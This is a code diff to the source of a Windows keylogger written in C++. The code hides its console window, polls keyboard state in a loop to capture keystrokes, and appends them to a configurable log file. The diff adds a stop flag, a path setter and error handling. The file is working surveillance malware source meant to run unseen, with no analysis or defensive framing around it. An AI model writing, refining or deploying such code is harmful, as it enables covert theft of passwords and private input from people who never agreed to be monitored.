@@ -1,14 +1,9 @@
 #include "Keylogger.hpp"
 
-void Keylogger::captureKey(int time)
-{
+void Keylogger::captureKey() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    auto duration = std::chrono::seconds(time);
-    auto start = std::chrono::steady_clock::now();
-    while (true) {
-        auto end = std::chrono::steady_clock::now();
-        if (end - start > duration) break;
-        Sleep(10);
+    running = true;
+    while (running) {
         for (int KEY = 8; KEY <= 190; KEY++) {
             if (GetAsyncKeyState(KEY) == -32767) {
                 if (!logSpecialKey(KEY)) {
@@ -19,14 +14,28 @@ void Keylogger::captureKey(int time)
     }
 }
 
-void Keylogger::log(const string &input) {
-    fstream logFile;
-    logFile.open(logFilename, fstream::app);
+void Keylogger::setPath(const std::string &filePath)
+{
+    logFilename = filePath;
+}
+
+void Keylogger::log(const std::string &input) {
+    std::fstream logFile;
+    logFile.open(logFilename, std::fstream::app);
     if (logFile.is_open()) {
         logFile << input;
         logFile.close();
+    } else {
+       std::cerr << "Can't open file with path: " << logFilename << '\n'; 
+       exit(1);
     }
 }
+
+void Keylogger::stop()
+{
+    running = false;
+}
+
 
 bool Keylogger::logSpecialKey(int key)
 {
